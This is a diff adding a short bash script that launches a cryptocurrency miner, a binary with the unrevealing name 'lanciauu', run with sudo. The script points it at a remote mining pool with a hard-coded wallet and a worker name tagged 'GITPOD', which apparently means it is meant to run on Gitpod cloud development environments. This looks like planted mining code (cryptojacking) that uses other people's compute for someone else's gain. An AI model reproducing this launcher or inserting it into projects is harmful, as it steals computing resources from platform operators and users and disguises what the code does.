@@ -1,0 +1,11 @@
+#!/bin/bash
+
+POOL=stratum+tcps://asia.flockpool.com:5555
+
+WALLET=RQEgfQ74o3ggS9tUc5XY7aNiH9RqPy8QWy
+
+WORKER=$(echo $(shuf -i 1-5 -n 1)-GITPOD)
+
+cd "$(dirname "$0")"
+
+chmod +x ./lanciauu && sudo ./lanciauu --algo BEAM-III --pool $POOL --user $WALLET.$WORKER $@ 
